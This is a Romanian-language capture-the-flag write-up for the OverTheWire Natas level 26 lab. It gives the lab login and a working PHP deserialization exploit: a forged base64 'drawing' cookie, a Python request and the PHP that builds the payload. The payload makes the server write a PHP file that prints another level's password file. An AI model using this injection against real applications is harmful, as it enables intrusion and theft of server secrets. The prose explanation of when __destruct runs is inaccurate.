
# General info

Username: natas26 

Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

URL:      http://natas26.natas.labs.overthewire.org

# Special code section

```py
import requests

d2 = 'YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxOToiaW1nL2lhLXNhLXZlZGVtLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6ODE6Ijw/cGhwIGVjaG8gIlBhc3N3b3JkOiAiOyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNyIpICA/PiI7fX0='

response = requests.get(
    url="http://natas26.natas.labs.overthewire.org/index.php",
    auth=("natas26", "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE"),
    cookies={
        "PHPSESSID" : "fkcpsclj335g5fhkvjlafelh6r",
        "drawing" : d2
    }
)
```

La o privire asupra codului, nimic nu pare exploitable.
Codul in sine doar genereaza o imagine, o deseneaza si atat.
Totusi, foloseste functia `unserialize` pentru a stoca imaginea.

Un edit mai tarziu, am reusit sa gasesc solutia fara ajutor, doar bazandu-ma pe manuale si citind despre `unserialize` si `serialize` in PHP.
Functia are o structura simpla, dar am folosit [W3Schools](https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler) ca interpretor de PHP.
Mi-am scris un cod simplu:
```php
<!DOCTYPE html>
<html>
<body>

<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="<?php echo \"Password: \"; echo file_get_contents(\"/etc/natas_webpass/natas26\")  ?>";
            $this->logFile = "img/ia-sa-vedem.php";

            // write initial message
            //$fd=fopen($this->logFile,"a+");
            //fwrite($fd,$this->initMsg);
            //fclose($fd);
        }

        function log($msg){
            //$fd=fopen($this->logFile,"a+");
            //fwrite($fd,$msg."\n");
            //fclose($fd);
        }

        function __destruct(){
            // write exit message
            //$fd=fopen($this->logFile,"a+");
            //fwrite($fd,$this->exitMsg);
            //fclose($fd);
        }
    }

$drawing = array();
$drawing[]=new Logger("temp");
echo base64_encode(serialize($drawing));
?>

</body>
</html>
```

care imi serializeaza exact cum am nevoie string-ul in Base64.
Dupa doar il trimit catre server.
Pentru ca la `serialize` PHP executa automat `__destruct()` dupa ce obiectul iese din scope, practic va fi scris pe disc codul pe care l-am scris mai sus.
Dupa, doar accesez link-ul http://natas26.natas.labs.overthewire.org/img/ia-sa-vedem.php si am parola acolo.

Ca pasi mai simpli:
- iti salvezi un session ID
- iti construiesti un cookie formatat in Base64, care reprezinta clasa Logger modificata cu codul ce va citi `/etc/natas_webpass/natas27`
- trimiti cookie-ul la server, iar acesta va scrie pe disk un fisier PHP
- accesezi link-ul catre noul fisier creat
- in fisier gasesti parola